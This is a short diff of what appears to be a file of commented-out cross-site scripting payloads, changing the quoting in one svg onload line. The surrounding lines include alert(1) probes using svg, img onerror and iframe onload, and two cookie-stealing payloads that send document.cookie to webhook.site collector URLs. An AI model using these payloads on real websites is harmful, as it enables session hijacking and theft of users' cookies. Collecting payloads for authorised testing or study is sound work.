@@ -24,7 +24,7 @@
 // new Image().src="https://webhook.site/2dc62e00-4e6c-4a13-a2ff-0cc59cc7dd90?cookie="+document.cookie;
 // </script>;
 //* script not allowed
-// <svg onload="alert(1)'>
+// <svg onload='alert(1)'>
 // <img src=1 onerror=alert(1)>
 // <iframe src=1 onload=alert(1)>
 // <img src=1 onerror="new Image().src='https://webhook.site/84ef8df6-e266-4ac4-85d4-1aef0b012f52?cookie='+document.cookie;">
